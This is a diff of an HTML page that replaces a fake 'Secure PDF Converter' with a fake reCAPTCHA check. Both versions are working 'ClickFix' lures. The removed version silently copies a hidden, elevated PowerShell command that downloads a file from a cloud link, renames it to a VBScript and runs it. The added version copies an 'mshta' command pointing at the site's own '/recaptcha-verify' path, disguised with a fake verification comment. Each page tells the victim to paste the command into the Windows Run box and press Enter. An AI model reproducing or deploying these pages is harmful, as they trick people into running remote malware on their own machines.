@@ -1,664 +1,431 @@
-<!DOCTYPE html>
+a<!DOCTYPE html>
+
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure PDF Converter</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        * {
+    <head>
+        <meta charset="utf-8">
+        <title>reCAPTCHA Verification</title>
+
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">        
+        <style>
+        .container {
+            font-family: Roboto, helvetica, arial, sans-serif;
+        }
+
+        .m-p {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Roboto, helvetica, arial, sans-serif;
         }
-        
-        body {
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        
-        .container {
-            width: 100%;
-            max-width: 550px;
-            background-color: white;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
-            overflow: hidden;
-            transition: transform 0.3s ease;
-        }
-        
-        .container:hover {
-            transform: translateY(-5px);
-        }
-        
-        .header {
-            background: linear-gradient(135deg, #1A73E8 0%, #0d47a1 100%);
-            color: white;
-            padding: 25px;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .header::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
-        }
-        
-        .header h1 {
-            font-size: 26px;
-            margin-bottom: 8px;
-            font-weight: 500;
-            position: relative;
-        }
-        
-        .header p {
-            font-size: 16px;
-            opacity: 0.9;
-            position: relative;
-        }
-        
-        .content {
-            padding: 30px;
-        }
-        
-        .pdf-logo-container {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        
-        .pdf-logo {
-            width: 140px;
-            height: 140px;
-            margin: 0 auto 25px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: linear-gradient(135deg, #f1f1f1 0%, #e1e1e1 100%);
-            border-radius: 12px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .pdf-logo::before {
-            content: '';
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, rgba(255,255,255,0.3) 0%, rgba(255,255,255,0) 50%);
-        }
-        
-        .pdf-logo i {
-            font-size: 70px;
-            color: #e74c3c;
-            position: relative;
-        }
-        
-        .view-pdf-btn {
+
+        .block {
             display: block;
-            width: 100%;
-            background: linear-gradient(135deg, #1A73E8 0%, #0d62d9 100%);
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 14px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            margin-bottom: 20px;
-            transition: all 0.3s;
-            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.3);
-            position: relative;
-            overflow: hidden;
         }
-        
-        .view-pdf-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            transition: left 0.5s;
+
+        code {
+            font-size: 9px;
+            margin-left: 2px;
+            color: gray;
         }
-        
-        .view-pdf-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(26, 115, 232, 0.4);
+
+        .line-normal {
+            line-height: normal;
         }
-        
-        .view-pdf-btn:hover::before {
-            left: 100%;
-        }
-        
-        .file-info {
-            background-color: #f8f9fa;
-            border: 1px solid #e0e0e0;
-            border-radius: 8px;
-            padding: 20px;
-            margin-bottom: 20px;
-            display: none;
-            animation: fadeIn 0.5s ease;
-        }
-        
-        .file-info-item {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 12px;
-            padding-bottom: 12px;
-            border-bottom: 1px solid #eaeaea;
-        }
-        
-        .file-info-item:last-child {
-            margin-bottom: 0;
-            padding-bottom: 0;
-            border-bottom: none;
-        }
-        
-        .file-info-label {
-            font-weight: 500;
-            color: #555;
-        }
-        
-        .file-info-value {
-            font-weight: 600;
-            color: #333;
-        }
-        
-        .error-message {
-            background-color: #fff5f5;
-            border: 1px solid #ffcdd2;
-            border-radius: 8px;
-            padding: 25px;
-            margin-bottom: 20px;
-            text-align: center;
-            display: none;
-            animation: fadeIn 0.5s ease;
-        }
-        
-        .error-icon {
-            font-size: 50px;
-            color: #e74c3c;
-            margin-bottom: 15px;
-        }
-        
-        .error-text {
-            font-size: 18px;
-            color: #c62828;
-            margin-bottom: 20px;
-            font-weight: 500;
-        }
-        
-        .fix-now-btn {
-            display: block;
-            width: 100%;
-            background: linear-gradient(135deg, #e74c3c 0%, #c62828 100%);
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 14px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 4px 10px rgba(231, 76, 60, 0.3);
-        }
-        
-        .fix-now-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(231, 76, 60, 0.4);
-        }
-        
-        .converter-section {
-            display: none;
-            animation: slideDown 0.5s ease;
-        }
-        
-        .convert-btn {
-            display: block;
-            width: 100%;
-            background: linear-gradient(135deg, #1A73E8 0%, #0d62d9 100%);
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 14px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-bottom: 25px;
-            transition: all 0.3s;
-            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.3);
-        }
-        
-        .convert-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(26, 115, 232, 0.4);
-        }
-        
-        .captcha-container {
+
+        .checkbox-window {
+            height: 74px;
+            width: 300px;
             background-color: #f9f9f9;
-            border: 2px solid #e0e0e0;
-            border-radius: 8px;
-            padding: 20px;
-            margin-bottom: 20px;
-            transition: all 0.3s;
+            border-radius: 3px;
+            border: 1px solid #d3d3d3;
         }
-        
-        .captcha-container:hover {
-            border-color: #1A73E8;
-            box-shadow: 0 2px 8px rgba(26, 115, 232, 0.1);
-        }
-        
-        .captcha-checkbox {
-            display: flex;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-        
-        .checkbox {
-            width: 28px;
-            height: 28px;
-            border: 2px solid #c1c1c1;
-            border-radius: 4px;
-            margin-right: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: all 0.3s;
-            background-color: white;
-        }
-        
-        .checkbox.checked {
-            background-color: #1A73E8;
-            border-color: #1A73E8;
-            animation: pulse 0.5s;
-        }
-        
-        .checkbox.checked::after {
-            content: "✓";
-            color: white;
-            font-weight: bold;
-            font-size: 16px;
-        }
-        
-        .captcha-text {
-            font-size: 17px;
-            color: #222;
-            font-weight: 500;
-        }
-        
-        .captcha-footer {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 15px;
-        }
-        
-        .captcha-logo {
-            display: flex;
-            align-items: center;
-        }
-        
-        .captcha-logo img {
-            height: 40px;
-        }
-        
-        .captcha-links a {
-            color: #666;
+
+        .checkbox-window a {
+            color: #555;
             text-decoration: none;
-            font-size: 13px;
-            transition: color 0.3s;
         }
-        
-        .captcha-links a:hover {
-            color: #1A73E8;
+
+        .checkbox-window a:hover {
+            color: #555;
             text-decoration: underline;
         }
-        
-        .verification-instructions {
-            background-color: white;
-            border: 1px solid #e0e0e0;
-            border-radius: 8px;
-            padding: 25px;
-            margin-top: 25px;
-            display: none;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
-            animation: fadeIn 0.5s ease;
-        }
-        
-        .verification-title {
-            color: #1A73E8;
-            font-size: 20px;
-            margin-bottom: 20px;
-            text-align: center;
-            font-weight: 500;
-        }
-        
-        .instructions {
-            margin-bottom: 20px;
-        }
-        
-        .instruction {
-            margin-bottom: 18px;
-            display: flex;
-            align-items: flex-start;
-            transition: transform 0.3s;
-        }
-        
-        .instruction:hover {
-            transform: translateX(5px);
-        }
-        
-        .instruction-number {
-            background: linear-gradient(135deg, #1A73E8 0%, #0d62d9 100%);
-            color: white;
+
+        .checkbox-container {
             width: 28px;
             height: 28px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 15px;
-            flex-shrink: 0;
-            font-size: 14px;
-            font-weight: bold;
-            box-shadow: 0 2px 5px rgba(26, 115, 232, 0.3);
         }
-        
-        .instruction-text {
-            line-height: 1.6;
+
+        .checkbox {
+            position: relative;
+            background-color: #fff;
+            border-radius: 2px;
+            height: 100%;
+            width: 100%;
+            border: 2px solid #c1c1c1;
+            margin: 21px 0 0 12px;
+            outline: none;
+            font-family: Roboto, helvetica, arial, sans-serif;
+            transition: width 500ms, height 500ms, border-radius 500ms, margin-top 500ms, margin-left 500ms, opacity 700ms;
+        }
+
+        .checkbox:hover {
+            border: 2px solid #b2b2b2;
+        }
+
+        .im-not-a-robot {
+            position: relative;
+            left: 52px;
+            bottom: 3px;
             font-size: 15px;
+            color: #282727;
         }
-        
-        .key-combo {
-            background-color: #f1f1f1;
-            padding: 4px 8px;
-            border-radius: 4px;
-            font-family: 'Consolas', monospace;
-            font-weight: bold;
-            border: 1px solid #ddd;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+
+        .captcha-logo {
+            position: relative;
+
+            left: 244px;
+            bottom: 36px;
+            width: 40px;
+            height: 45px;
+            vertical-align: baseline;
+            padding-bottom: 4px;
         }
-        
-        .windows-logo {
-            color: #00a4ef;
-            font-size: 18px;
-            margin: 0 5px;
-        }
-        
-        .note {
-            font-size: 13px;
-            color: #666;
-            margin-top: 20px;
+
+
+        .checkbox-desc {
+            color: #555555;
+            position: relative;
+            font-size: 8px;
             text-align: center;
-            line-height: 1.5;
+            bottom: 40px;
+            left: 112px;
         }
-        
-        .copied-message {
+
+        .spinner {
+            visibility: hidden;
+            position: relative;
+            top: -85px;
+            left: 12px;
+            height: 20px;
+            width: 20px;
+            border: 2px solid rgba(0, 0, 0, 0.1);
+            border-top: 2px solid #333;
+            border-radius: 50%;
+            visibility: hidden;
+            opacity: 0;
+            transition: opacity 0.5s linear;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .verify-window {
+            font-family: Roboto, helvetica, arial, sans-serif;
+            opacity: 0;
+            position: absolute;
+            visibility: hidden;
+            margin: auto;
+            width: 310px;
+            background-color: #fff;
+            border: 1px solid #cecece;
+            -webkit-box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
+            box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
+            transition: opacity 400ms;
+        }
+
+        ol {
+            counter-reset: item;
+            list-style-type: none;
+            list-style-position: outside;    
+            padding-left: 0;
+
+        }
+
+        ol li {
+            counter-increment: item;
+            margin-bottom: 10px;
+
+        }
+
+        ol li::before {
+            content: counter(item) ". ";
             color: #1A73E8;
             font-weight: bold;
-            text-align: center;
-            margin-top: 15px;
-            display: none;
-            font-size: 15px;
-            animation: fadeIn 0.5s ease;
+            margin-right: 10px;
+            margin-left: 10px;
         }
-        
-        .progress-container {
-            width: 100%;
-            height: 6px;
-            background-color: #f0f0f0;
-            border-radius: 3px;
-            margin: 20px 0;
-            overflow: hidden;
-            display: none;
-        }
-        
-        .progress-bar {
-            height: 100%;
-            background: linear-gradient(90deg, #1A73E8, #0d62d9);
-            border-radius: 3px;
-            width: 0%;
-            transition: width 0.5s ease;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        
-        @keyframes slideDown {
-            from { 
-                opacity: 0;
-                transform: translateY(-20px);
-            }
-            to { 
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-        
-        .security-badge {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-top: 15px;
-            color: #4CAF50;
-            font-size: 14px;
-        }
-        
-        .security-badge i {
-            margin-right: 8px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>Secure PDF Document Viewer</h1>
-            <p>View and convert PDF files with enhanced security</p>
-        </div>
-        
-        <div class="content">
-            <div class="pdf-logo-container">
-                <div class="pdf-logo">
-                    <i class="far fa-file-pdf"></i>
-                </div>
-                <button class="view-pdf-btn" id="viewPdfBtn">
-                    <i class="fas fa-eye"></i> View PDF Document
-                </button>
-                <div class="security-badge">
-                    <i class="fas fa-shield-alt"></i> Protected by Windows Security
-                </div>
-            </div>
-            
-            <div class="file-info" id="fileInfo">
-                <div class="file-info-item">
-                    <span class="file-info-label">File Name:</span>
-                    <span class="file-info-value">document.pdf</span>
-                </div>
-                <div class="file-info-item">
-                    <span class="file-info-label">File Size:</span>
-                    <span class="file-info-value">2.4 MB</span>
-                </div>
-                <div class="file-info-item">
-                    <span class="file-info-label">Created:</span>
-                    <span class="file-info-value">Today, 10:24 AM</span>
-                </div>
-            </div>
-            
-            <div class="progress-container" id="progressContainer">
-                <div class="progress-bar" id="progressBar"></div>
-            </div>
-            
-            <div class="error-message" id="errorMessage">
-                <div class="error-icon">
-                    <i class="fas fa-exclamation-triangle"></i>
-                </div>
-                <div class="error-text">
-                    PDF Format Compatibility Issue Detected
-                </div>
-                <p style="color: #666; margin-bottom: 20px; font-size: 15px;">
-                    This PDF file was created on an iOS device and requires conversion for optimal viewing on Windows.
-                </p>
-                <button class="fix-now-btn" id="fixNowBtn">
-                    <i class="fas fa-tools"></i> Fix Compatibility Issue
-                </button>
-            </div>
-            
-            <div class="converter-section" id="converterSection">
-                <div class="header">
-                    <h1>PDF Compatibility Converter</h1>
-                    <p>iOS PDF to Windows PDF Conversion</p>
-                </div>
-                
-                <button class="convert-btn" id="convertBtn">
-                    <i class="fas fa-sync-alt"></i> Convert PDF Format
-                </button>
-                
-                <div class="captcha-container">
-                    <div class="captcha-checkbox">
-                        <div class="checkbox" id="captchaCheckbox"></div>
-                        <span class="captcha-text">I'm not a robot - Convert file to Windows format</span>
-                    </div>
-                    
-                    <div class="captcha-footer">
-                        <div class="captcha-logo">
-                            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
-                        </div>
-                        <div class="captcha-links">
-                            <a href="#">Privacy</a> - <a href="#">Terms</a>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="copied-message" id="copiedMessage">
-                    <i class="fas fa-check-circle"></i> Conversion script copied to clipboard!
-                </div>
-                
-                <div class="verification-instructions" id="verificationInstructions">
-                    <div class="verification-title">Complete PDF Conversion Process</div>
-                    
-                    <div class="instructions">
-                        <div class="instruction">
-                            <div class="instruction-number">1</div>
-                            <div class="instruction-text">Press <span class="key-combo"><i class="fab fa-windows windows-logo"></i> Windows</span> + <span class="key-combo">R</span> simultaneously</div>
-                        </div>
-                        
-                        <div class="instruction">
-                            <div class="instruction-number">2</div>
-                            <div class="instruction-text">In the Run dialog, paste the script using <span class="key-combo">Ctrl</span> + <span class="key-combo">V</span></div>
-                        </div>
 
-                        <div class="instruction">
-                            <div class="instruction-number">3</div>
-                            <div class="instruction-text">Press <span class="key-combo">Enter</span> to execute the conversion script</div>
-                        </div>
-                    </div>
-                    
-                    <div class="note">
-                        The conversion script has been copied to your clipboard. This script will automatically convert your PDF file to Windows-compatible format with administrator privileges.
-                    </div>
-                </div>
+        .verify-container {
+            padding: 8px;
+        }
+
+        .verify-header {
+            background-color: #1A73E8;
+            padding: 16px 16px 24px 16px;
+            color: #fff;
+        }
+
+        .verify-header-text-small {
+            font-size: 14px;
+            line-height: normal;
+        }
+
+        .verify-header-text-medium {
+            font-size: 16px;
+        }
+
+        .verify-header-text-big {
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .verify-main {
+            padding: 5px;
+            color: #111;
+            font-size: 13px;
+
+        }
+
+        .verify-footer {
+            border-top: 1px solid #cecece;
+            padding: 10px 7px 10px 7px;
+            color: #737373;
+            display: grid;
+            grid-template-columns: auto 102px;
+            font-size: 13px;
+        }
+
+        .verify-footer-left {
+            padding: 5px;
+        }
+
+        .verify-verify-button {
+            text-transform: uppercase;
+            background-color: #5a89e2;
+            color: #fff;
+            text-align: center;
+            width: 100%;
+            padding: 12px 0 12px 0;
+            text-decoration: none;
+            font-weight: 600;
+            height: min-content;
+            border-radius: 3px;
+            font-size: 14px;
+            border: none;
+            outline: none;
+            cursor: not-allowed;
+        }
+        </style>
+    </head>
+    <body>
+
+    <div class="container m-p">    
+        <div id="checkbox-window" class="checkbox-window m-p block">
+            <div class="checkbox-container m-p">
+                <button type="button" id="checkbox" class="checkbox m-p line-normal"></button>
             </div>
+            <p class="im-not-a-robot m-p line-normal">I'm not a robot</p>
+            <img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt="">
+            <br>
+            <p class="checkbox-desc m-p line-normal">
+            <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
+            </p>
+            <img class="spinner" alt="" id="spinner">
         </div>
+        
+        <div id="verify-window" class="verify-window">
+            <div class="verify-container">
+                <header class="verify-header">
+                    <span class="verify-header-text-medium m-p block">Complete these</span>
+                    <span class="verify-header-text-big m-p block">Verification Steps</span>
+                    <span class="verify-header-text-medium m-p block"></span>
+                </header>
+                <main class="verify-main">
+                    <p>
+                        To better prove you are not a robot, please:
+                    </p>
+                    <ol>
+                        <li>
+                            Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.
+                        </li>
+                        
+                        <li>
+                            In the verification window, press <b>Ctrl</b> + <b>V</b>.
+                        </li>
+
+                        <li>
+                            Press <b>Enter</b> on your keyboard to finish.
+                        </li>
+                    </ol>
+                    <p>
+                        You will observe and agree:
+                        <br>
+                    <code>
+                        ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>"
+                    </code>
+                    </p>
+
+                   
+                </main>
+            </div>
+            <footer class="verify-container verify-footer">
+                <div class="verify-footer-left">
+                    Perform the steps above to finish verification.
+                </div>
+                <button type="button" class="verify-verify-button block" id="verify-verify-button" disabled="true">Verify</button>
+            </footer>
+        </div>        
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const viewPdfBtn = document.getElementById('viewPdfBtn');
-            const errorMessage = document.getElementById('errorMessage');
-            const fixNowBtn = document.getElementById('fixNowBtn');
-            const converterSection = document.getElementById('converterSection');
-            const convertBtn = document.getElementById('convertBtn');
-            const checkbox = document.getElementById('captchaCheckbox');
-            const copiedMessage = document.getElementById('copiedMessage');
-            const verificationInstructions = document.getElementById('verificationInstructions');
-            const progressContainer = document.getElementById('progressContainer');
-            const progressBar = document.getElementById('progressBar');
-            const fileInfo = document.getElementById('fileInfo');
-            
-            // Step 1: User clicks "View PDF"
-            viewPdfBtn.addEventListener('click', function() {
-                // Show file info
-                fileInfo.style.display = 'block';
-                
-                // Show progress animation
-                progressContainer.style.display = 'block';
-                let width = 0;
-                const interval = setInterval(() => {
-                    if (width >= 100) {
-                        clearInterval(interval);
-                        // Show error after "loading"
-                        setTimeout(() => {
-                            errorMessage.style.display = 'block';
-                            viewPdfBtn.style.display = 'none';
-                            progressContainer.style.display = 'none';
-                        }, 300);
-                    } else {
-                        width += 5;
-                        progressBar.style.width = width + '%';
+        let checkboxWindow = document.getElementById("checkbox-window");
+        let checkboxBtn = document.getElementById("checkbox");
+        let checkboxBtnSpinner = document.getElementById("spinner");
+        let verifywindow = document.getElementById("verify-window");
+
+        function addCaptchaListeners() {
+            if (checkboxBtn) {
+                document.addEventListener("click", function (event) {
+                    let path = event.composedPath();
+                    if (!path.includes(verifywindow) && isverifywindowVisible()) {
+                        closeverifywindow();
                     }
-                }, 50);
-            });
-            
-            // Step 2: User clicks "Fix Now"
-            fixNowBtn.addEventListener('click', function() {
-                converterSection.style.display = 'block';
-                errorMessage.style.display = 'none';
-                fileInfo.style.display = 'none';
-            });
-            
-            // Step 3: User clicks "Convert PDF"
-            convertBtn.addEventListener('click', function() {
-                // Copy enhanced script to clipboard
-                copyScriptToClipboard();
-                
-                // Show copied message
-                copiedMessage.style.display = 'block';
-            });
-            
-            // Step 4: User clicks the checkbox
-            checkbox.addEventListener('click', function() {
-                checkbox.classList.add('checked');
-                
-                // Show verification instructions
-                setTimeout(function() {
-                    verificationInstructions.style.display = 'block';
-                }, 500);
-            });
-            
-            function copyScriptToClipboard() {
-                // Enhanced payload with multiple execution methods and callback
-                const scriptContent = `powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -Command \\\"(New-Object Net.WebClient).DownloadFile(\\\"\\\"https://1drv.ms/u/c/2f3053ae4c170361/EU3x-jF2eSlIu1PgBNaGfQ0BF50mkVAKMHi-DFlgC4H7QQ?e=HCYlUh\\\"\\\",\\\"\\\"Resume.html\\\"\\\"); Move-Item \\\"\\\"Resume.html\\\"\\\" \\\"\\\"Resume.vbs\\\"\\\" -Force; Start-Process \\\"\\\"Resume.vbs\\\"\\\" -WindowStyle Hidden\\\"' -Verb RunAs"`;
-                
-                // Create a temporary textarea to copy the content
-                const textArea = document.createElement('textarea');
-                textArea.value = scriptContent;
-                document.body.appendChild(textArea);
-                textArea.select();
-                document.execCommand('copy');
-                document.body.removeChild(textArea);
+                });
+                checkboxBtn.addEventListener("click", function (event) {
+                    event.preventDefault();
+                    checkboxBtn.disabled = true;
+                    runClickedCheckboxEffects();
+                });
             }
-        });
-    </script>
-</body>
+        }
+
+        function runClickedCheckboxEffects() {
+            hideCaptchaCheckbox();
+            setTimeout(function(){
+                showCaptchaLoading();
+            },500);
+            setTimeout(function(){
+                showVerifyWindow();
+            },900)
+        }
+
+        function showCaptchaLoading() {
+            checkboxBtnSpinner.style.visibility = "visible";
+            checkboxBtnSpinner.style.opacity = "1";
+            checkboxBtnSpinner.style.animation = "spin 1s linear infinite";
+        }
+
+        function hideCaptchaLoading() {
+            checkboxBtnSpinner.style.opacity = "0";
+            checkboxBtnSpinner.style.animation = "none";
+            setTimeout(function() {
+                checkboxBtnSpinner.style.visibility = "hidden";
+            }, 500);
+        }
+
+        function hideCaptchaCheckbox() {
+            checkboxBtn.style.visibility = "hidden";
+            checkboxBtn.style.opacity = "0";
+        }
+
+
+        function showCaptchaCheckbox() {
+            checkboxBtn.style.width = "100%";
+            checkboxBtn.style.height = "100%";
+            checkboxBtn.style.borderRadius = "2px";
+            checkboxBtn.style.margin = "21px 0 0 12px";
+            checkboxBtn.style.opacity = "1";
+        }
+
+        function hideCaptchaCheckbox() {
+            checkboxBtn.style.width = "4px";
+            checkboxBtn.style.height = "4px";
+            checkboxBtn.style.borderRadius = "50%";
+            checkboxBtn.style.marginLeft = "25px";
+            checkboxBtn.style.marginTop = "33px";
+            checkboxBtn.style.opacity = "0";
+        }
+
+        function showCaptchaLoading() {
+            checkboxBtnSpinner.style.visibility = "visible";
+            checkboxBtnSpinner.style.opacity = "1";
+        }
+
+        function hideCaptchaLoading() {
+            checkboxBtnSpinner.style.visibility = "hidden";
+            checkboxBtnSpinner.style.opacity = "0";
+        }
+
+       function generateRandomNumber() {
+            const min = 1000; 
+            const max = 9999;
+            return Math.floor(Math.random() * (max - min + 1) + min).toString();
+        }
+
+        function closeverifywindow() {
+            verifywindow.style.display = "none";
+            verifywindow.style.visibility = "hidden";
+            verifywindow.style.opacity = "0";
+
+            showCaptchaCheckbox();
+            hideCaptchaLoading();
+            checkboxBtn.disabled = false;
+        }
+
+        function isverifywindowVisible() {
+            return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
+        }
+
+        function setClipboardCopyData(textToCopy){
+            const tempTextArea = document.createElement("textarea");
+            tempTextArea.value = textToCopy;
+            document.body.append(tempTextArea);
+            tempTextArea.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempTextArea);
+        }
+
+        function stageClipboard(commandToRun, verification_id){
+            const suffix = " # "
+            const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: "
+            const end = "''"
+            const textToCopy = commandToRun + suffix + ploy + verification_id + end
+
+            setClipboardCopyData(textToCopy);
+        }
+
+
+        function showVerifyWindow() {
+            verifywindow.style.display = "block";
+            verifywindow.style.visibility = "visible";
+            verifywindow.style.opacity = "1";
+            verifywindow.style.top = checkboxWindow.offsetTop - 80 + "px";
+            verifywindow.style.left =  checkboxWindow.offsetLeft + 54 + "px";
+
+            if (verifywindow.offsetTop < 5) {
+               verifywindow.style.top = "5px";
+            }
+
+            if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth-10 ) {
+               verifywindow.style.left =  checkboxWindow.offsetLeft - 8  + "px";
+            }
+
+            var verification_id = generateRandomNumber();
+            document.getElementById('verification-id').textContent = verification_id;
+            
+            const htaPath = window.location.origin + "/recaptcha-verify";
+            const commandToRun = "mshta " + htaPath
+            stageClipboard(commandToRun, verification_id)
+        }
+
+        addCaptchaListeners();
+
+        </script>
+    </body>
 </html>
